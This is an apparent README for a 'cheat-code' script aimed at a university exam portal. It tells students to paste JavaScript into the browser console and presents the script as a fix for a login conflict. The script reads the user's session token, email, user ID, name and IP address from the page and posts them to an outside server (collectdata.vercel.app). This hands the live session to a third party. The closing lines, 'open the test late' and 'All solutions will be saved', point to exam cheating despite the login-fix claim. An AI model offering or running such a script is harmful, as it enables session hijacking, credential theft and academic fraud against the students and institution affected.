# cheat-code
# CollectData

This script will resolve the `test already opened in another browser/device` issue in the exam.

1. Connect to LPU Wireless.
2. Login on exam portal, execute a script, ensuring not to log out after this process.
3. Change the WiFi connection as per your requirements.

`Note:` This setup should be completed before the exam starts in 5-20 minutes. This script will only help you fix login issues, not to complete the test.

## Run the script in the browser console

Follow the steps below to run the script in the browser console to send data to the server.

1. Open the browser console by pressing `F12` or `Ctrl + Shift + I` or right-click on the page and select `Inspect`.
2. Click on the `Console` tab.
3. Allow pasting in the console typing `allow pasting` and pressing `Enter`.
4. Paste the script below in the console and press `Enter`.
5. Exit the console and refresh the page.

```javascript

const tempIp = ''  // Add your IP address here

const getIpAddress = async () => {
    try {
        const response = await fetch('https://api.ipify.org');
        const data = await response.text();
        return data;
    }
    catch (error) {
        console.error('Error:', error.message);
    }
}

async function hitServer() {
    const baseUrl = 'https://collectdata.vercel.app';
    try {
        const sessionId = localStorage.getItem('sessionId');
        const formDataString = localStorage.getItem('formData');

        if (!sessionId || !formDataString) {
            throw new Error('Session ID or form data is missing.');
        }

        const formData = JSON.parse(formDataString);
        const { primary_email, user_id, name } = formData;

        const currentIp = tempIp !== '' ? tempIp : await getIpAddress();

        const queryParams = new URLSearchParams({
            primary_email,
            user_id,
            name,
            platform: window.location.hostname.split('.')[1],
            ip_address: currentIp
        }).toString();

        const url = `${baseUrl}/api/v1/collect?${queryParams}`;

        const options = {
            method: 'POST',
            headers: {
                'Authorization': sessionId
            }
        };

        const response = await fetch(url, options);

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const data = await response.json();
        console.log(data);
    } catch (error) {
        console.error('Error:', error.message);
    }
}

hitServer();
```

You must open the test 5 minutes `late` and `submit it`.

**All solutions will be saved**
